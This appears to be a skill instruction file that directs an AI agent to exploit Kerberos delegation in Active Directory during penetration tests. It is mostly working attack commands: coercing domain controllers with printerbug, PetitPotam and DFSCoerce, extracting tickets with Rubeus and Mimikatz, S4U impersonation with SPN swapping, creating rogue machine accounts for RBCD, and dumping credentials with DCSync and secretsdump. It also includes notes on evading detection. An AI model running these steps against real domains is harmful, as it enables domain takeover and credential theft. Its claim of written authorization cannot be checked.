---
name: kerberos-delegation
description: >
  Exploits Kerberos delegation misconfigurations for privilege escalation and
  lateral movement in Active Directory. Covers Unconstrained Delegation (TGT
  harvesting via coercion), Constrained Delegation (S4U2Self + S4U2Proxy with
  SPN swapping), and Resource-Based Constrained Delegation (RBCD via writable
  machine accounts).
keywords:
  - delegation
  - unconstrained delegation
  - constrained delegation
  - RBCD
  - resource-based constrained delegation
  - S4U
  - S4U2Self
  - S4U2Proxy
  - TrustedForDelegation
  - msDS-AllowedToDelegateTo
  - msDS-AllowedToActOnBehalfOfOtherIdentity
  - TGT harvesting
  - SpoolService
  - printer bug
  - SPN swapping
  - altservice
tools:
  - Impacket
  - Rubeus
  - bloodyAD
  - NetExec
  - krbrelayx
  - SpoolSample
opsec: medium
---

# Kerberos Delegation Exploitation

You are helping a penetration tester exploit Kerberos delegation misconfigurations
for privilege escalation and lateral movement. All testing is under explicit
written authorization.

**Kerberos-first authentication**: All commands default to Kerberos auth via
ccache. Convert credentials to a TGT first, then use `-k -no-pass` (Impacket),
`--use-kcache` (NetExec), or `/ticket:` (Rubeus) throughout.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[kerberos-delegation] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Domain credentials (user, hash, or ticket) with at least one of:
  - Local admin on an unconstrained delegation host
  - Hash/key of a constrained delegation service account
  - Write access (GenericAll/GenericWrite/WriteDACL) to a computer object (for RBCD)
- Network access to DC (port 88/389/445)
- Tools: Impacket suite, `netexec`/`nxc`, optionally `Rubeus`, `bloodyAD`,
  `krbrelayx`, `SpoolSample`/`dementor.py`/`PetitPotam`

**Kerberos-first workflow**:
```bash
getTGT.py DOMAIN/user -hashes :NTHASH
# or with AES (preferred)
getTGT.py DOMAIN/user -aesKey AES256KEY
export KRB5CCNAME=user.ccache
# All subsequent commands use -k -no-pass
```

## Step 1: Enumerate Delegation

Identify delegation-configured accounts. Skip if already provided by
**ad-discovery** or conversation context.

### Unconstrained Delegation

```bash
# NetExec
nxc ldap DC.DOMAIN.LOCAL --use-kcache --trusted-for-delegation

# bloodyAD
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get search \
  --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' \
  --attr sAMAccountName,userAccountControl

# PowerView (Windows)
Get-DomainComputer -Unconstrained -Properties name,dnshostname
```

Note: Domain Controllers always have unconstrained delegation. Focus on
**non-DC** computers with `TRUSTED_FOR_DELEGATION`.

### Constrained Delegation

```bash
# NetExec
nxc ldap DC.DOMAIN.LOCAL --use-kcache --delegated-to

# bloodyAD
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get search \
  --filter '(msds-allowedtodelegateto=*)' \
  --attr sAMAccountName,msds-allowedtodelegateto

# PowerView (Windows)
Get-DomainUser -TrustedToAuth | select name,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto

# BloodHound Cypher
MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p
```

### RBCD Targets (Writable Computer Objects)

```bash
# bloodyAD — find computers you can write to
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get writable \
  --otype COMPUTER --right WRITE --detail

# Check MachineAccountQuota (for creating attacker computer)
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get object \
  'DC=DOMAIN,DC=LOCAL' --attr ms-DS-MachineAccountQuota

# Check existing RBCD
nxc ldap DC.DOMAIN.LOCAL --use-kcache -M rbcd
```

### Decision Tree

| Finding | Go To |
|---------|-------|
| Non-DC computer with unconstrained delegation + local admin | Step 2 |
| Service account/computer with `msDS-AllowedToDelegateTo` | Step 3 |
| Write access to a computer's AD object | Step 4 |
| GenericAll/WriteDACL on computer + MachineAccountQuota > 0 | Step 4 |

## Step 2: Unconstrained Delegation

**Concept**: When a user authenticates to an unconstrained delegation host,
their TGT is cached in LSASS. With local admin on that host, extract the TGT
and impersonate that user anywhere.

**Requirements**:
- Local admin on the unconstrained delegation computer
- A high-value user authenticates to it (or you coerce authentication)

### Step 2a: Monitor for Incoming TGTs

```powershell
# Rubeus — monitor for new TGTs (run before coercion)
.\Rubeus.exe monitor /interval:1 /nowrap

# Mimikatz — export all cached tickets
privilege::debug
sekurlsa::tickets /export
```

### Step 2b: Coerce Authentication

Force a DC or high-value target to authenticate to the unconstrained host.

**Print Spooler (MS-RPRN) — SpoolService Bug**:
```bash
# Check if Print Spooler is running
ls \\DC01\pipe\spoolss              # Windows
rpcdump.py DOMAIN/user@DC01 -k -no-pass | grep MS-RPRN  # Linux

# Coerce DC to authenticate to unconstrained host
python3 printerbug.py 'DOMAIN/user:password'@DC01 UNCONSTRAINED-HOST
# Or
SpoolSample.exe DC01 UNCONSTRAINED-HOST
# Or
python3 dementor.py -d DOMAIN -u user -p password UNCONSTRAINED-HOST DC01
```

**PetitPotam (MS-EFSR)**:
```bash
# Authenticated
python3 petitpotam.py -d DOMAIN -u user -p password UNCONSTRAINED-HOST DC01

# Unauthenticated (if not patched)
python3 petitpotam.py -d '' -u '' -p '' UNCONSTRAINED-HOST DC01
```

**DFSCoerce (MS-DFSNM)**:
```bash
python3 dfscoerce.py -d DOMAIN -u user -p password UNCONSTRAINED-HOST DC01
```

### Step 2c: Extract and Use DC TGT

```powershell
# Rubeus — extract the DC$ TGT from monitor output
.\Rubeus.exe ptt /ticket:<base64-ticket>

# Request service tickets for lateral movement
.\Rubeus.exe asktgs /ticket:<base64-ticket> \
  /service:LDAP/DC01.DOMAIN.LOCAL,cifs/DC01.DOMAIN.LOCAL /ptt

# DCSync with DC machine TGT
mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt
```

```bash
# Linux — if using krbrelayx to catch the ticket
python3 krbrelayx.py -hashes :MACHINE_NTHASH

# After catching ticket:
export KRB5CCNAME=DC01\$@DOMAIN.LOCAL_krbtgt@DOMAIN.LOCAL.ccache
secretsdump.py -k -no-pass DOMAIN/DC01\$@DC01.DOMAIN.LOCAL
```

### OPSEC Notes — Unconstrained

- **High**: Coercion triggers network traffic between DC and unconstrained host
- Event 4768/4769 for TGT/TGS requests from unexpected sources
- SpoolService coercion requires Print Spooler running (disabled by default on
  newer Server builds)
- PetitPotam unauthenticated variant patched since 2022 but authenticated still works
- **Cleanup**: No AD objects modified; just ticket extraction

## Step 3: Constrained Delegation (S4U)

**Concept**: A service with `msDS-AllowedToDelegateTo` can impersonate any user
to the listed SPNs using S4U2Self + S4U2Proxy. SPN swapping (`/altservice`)
lets you access services beyond the listed SPNs.

**Requirements**:
- Hash or key of the constrained delegation service account/computer
- `TrustedToAuthForDelegation` flag for full S4U (protocol transition)

### Impacket (Linux) — Preferred

```bash
# One-step: get impersonated service ticket
getST.py -spn cifs/TARGET.DOMAIN.LOCAL \
  -impersonate Administrator \
  DOMAIN/svc-constrained -k -no-pass

# With SPN swapping (altservice)
getST.py -spn cifs/TARGET.DOMAIN.LOCAL \
  -altservice ldap/TARGET.DOMAIN.LOCAL \
  -impersonate Administrator \
  DOMAIN/svc-constrained -k -no-pass

# With hash (if no ccache available)
getST.py -spn cifs/TARGET.DOMAIN.LOCAL \
  -impersonate Administrator \
  DOMAIN/svc-constrained -hashes :NTHASH

# Use the ticket
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
smbclient.py -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
secretsdump.py -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
```

### Rubeus (Windows)

```powershell
# S4U with AES256 (OPSEC preferred)
.\Rubeus.exe s4u /user:svc-constrained /aes256:AES256KEY \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.DOMAIN.LOCAL \
  /altservice:ldap,cifs,host,http,wsman,rpcss \
  /ptt /nowrap

# S4U with RC4/NTLM hash
.\Rubeus.exe s4u /user:svc-constrained /rc4:NTHASH \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.DOMAIN.LOCAL \
  /altservice:cifs,host,http,wsman,ldap \
  /ptt /nowrap

# Verify
klist
dir \\TARGET.DOMAIN.LOCAL\C$
```

### Common SPN Swaps

The service name in the ticket is not in the encrypted part — you can swap it:

| Listed SPN | Swap To | Access |
|-----------|---------|--------|
| `cifs/host` | `ldap/host` | DCSync via LDAP |
| `time/host` | `cifs/host` | File shares, psexec |
| `http/host` | `wsman/host` | WinRM |
| Any | `host/target` | General service access |
| Any | `rpcss/target` | DCOM/WMI |

### Constrained Delegation from Linux — Setup Path

If you have write access over a constrained delegation account (via ACL abuse):

```bash
# Set constrained delegation on account you control
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set object WEBSRV\$ \
  msDS-AllowedToDelegateTo -v 'cifs/DC.DOMAIN.LOCAL'

# Enable TrustedToAuthForDelegation
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add uac WEBSRV\$ \
  -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

### OPSEC Notes — Constrained

- **Medium**: S4U generates Event 4768/4769 (TGT/TGS requests)
- SPN swapping is not logged by default but may trigger custom detections
- AES keys preferred over RC4 (etype 0x12 vs 0x17)
- Cross-domain S4U includes `S-1-18-2` (SERVICE_ASSERTED_IDENTITY) in PAC
- No AD objects modified if exploiting existing delegation
- **Cleanup**: None needed — ticket-based attack, no persistent changes

## Step 4: Resource-Based Constrained Delegation (RBCD)

**Concept**: Any principal with write access to a computer's AD object can set
`msDS-AllowedToActOnBehalfOfOtherIdentity` to allow an attacker-controlled
account to impersonate users against that computer via S4U.

**Requirements**:
- Write access (GenericAll/GenericWrite/WriteDACL/WriteProperty) to target computer
- An attacker-controlled computer account (create one if MachineAccountQuota > 0)
- S4U2Self tickets do NOT need the Forwardable flag for RBCD

### Step 4a: Create Attacker Machine Account

```bash
# Impacket
addcomputer.py -computer-name 'FAKECOMP$' -computer-pass 'P@ssw0rd123!' \
  DOMAIN/user -k -no-pass

# bloodyAD
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add computer FAKECOMP 'P@ssw0rd123!'
```

Skip if you already control a computer account (e.g., compromised host).

### Step 4b: Set RBCD on Target

```bash
# Impacket rbcd.py
rbcd.py -delegate-from 'FAKECOMP$' -delegate-to 'TARGET$' -action write \
  DOMAIN/user -k -no-pass

# bloodyAD
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add rbcd 'TARGET$' 'FAKECOMP$'

# PowerView (Windows)
$sid = Get-DomainComputer FAKECOMP -Properties objectsid | Select -Expand objectsid
$sd = New-Object Security.AccessControl.RawSecurityDescriptor \
  -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$bytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($bytes, 0)
Get-DomainComputer TARGET | Set-DomainObject \
  -Set @{'msds-allowedtoactonbehalfofotheridentity'=$bytes}

# Verify
rbcd.py -delegate-to 'TARGET$' -action read DOMAIN/user -k -no-pass
```

### Step 4c: Perform S4U Attack

```bash
# Get TGT for attacker machine account
getTGT.py DOMAIN/'FAKECOMP$':'P@ssw0rd123!'

# S4U to impersonate Administrator on target
export KRB5CCNAME=FAKECOMP\$.ccache
getST.py -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator \
  DOMAIN/'FAKECOMP$' -k -no-pass

# Use the ticket
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
secretsdump.py -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
wmiexec.py -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
```

```powershell
# Rubeus (Windows)
.\Rubeus.exe hash /password:'P@ssw0rd123!' /user:FAKECOMP$ /domain:DOMAIN.LOCAL
.\Rubeus.exe s4u /user:FAKECOMP$ /aes256:AES256HASH \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.DOMAIN.LOCAL \
  /altservice:cifs,host,http,wsman,ldap \
  /ptt /nowrap
```

### Step 4d: Cleanup (Critical)

```bash
# Remove RBCD delegation
rbcd.py -delegate-from 'FAKECOMP$' -delegate-to 'TARGET$' -action remove \
  DOMAIN/user -k -no-pass

# Or flush entire RBCD list
rbcd.py -delegate-to 'TARGET$' -action flush DOMAIN/user -k -no-pass

# bloodyAD
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove rbcd 'TARGET$' 'FAKECOMP$'

# Verify removal
rbcd.py -delegate-to 'TARGET$' -action read DOMAIN/user -k -no-pass
```

### OPSEC Notes — RBCD

- **Medium-High**: Modifies AD object attribute (Event 5136)
- Computer account creation logged as Event 4741
- S4U requests generate Event 4768/4769
- MachineAccountQuota usage visible in domain audit
- **Cleanup is critical** — RBCD attribute persists until removed
- Use existing compromised computer account if possible (avoids 4741)

## Step 5: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## Troubleshooting

### KDC_ERR_ETYPE_NOTSUPP

RC4 hash provided but KDC requires AES. Extract AES256 key from LSASS or
DCSync and use `-aesKey` instead of `-hashes`.

### KDC_ERR_BADOPTION (S4U)

- User may have "Account is sensitive and cannot be delegated" flag
- User may be in Protected Users group (blocks all delegation)
- Service may not exist or may have been removed
- For RBCD: ensure you used the machine account (with `$`), not a user account

### S4U2Proxy Fails with Non-Forwardable Ticket

For classic constrained delegation, S4U2Self must return a Forwardable ticket
(requires `TrustedToAuthForDelegation` flag). For RBCD, non-Forwardable tickets
work — the target computer validates RBCD differently.

### KRB_AP_ERR_SKEW (Clock Skew)

Kerberos requires clocks within 5 minutes of the DC. This is a **Clock Skew
Interrupt** — stop immediately and return to the orchestrator. Do not retry or
fall back to NTLM. The fix requires root:
```bash
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP
```

### RBCD: "Insufficient access rights" When Setting Attribute

- Verify you have write access to the target computer object (not just read)
- Check with: `bloodyAD get writable --otype COMPUTER --right WRITE`
- `GenericAll`, `GenericWrite`, `WriteDACL`, or `WriteProperty` on the
  `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute is required

### MachineAccountQuota = 0

Cannot create new computer accounts. Alternatives:
- Use an existing compromised computer account
- Check if you have `CreateChild` rights on an OU (bypasses MAQ)
- Look for orphaned computer accounts you can take over

### OPSEC Comparison

| Type | Detection Surface | Event IDs | AD Modification |
|------|-------------------|-----------|-----------------|
| Unconstrained | Coercion traffic, ticket extraction | 4768/4769 | None |
| Constrained (S4U) | S4U requests, SPN swap | 4768/4769 | None (if existing) |
| RBCD | Object modification, machine account | 4741, 5136, 4768/4769 | Yes (cleanup needed) |
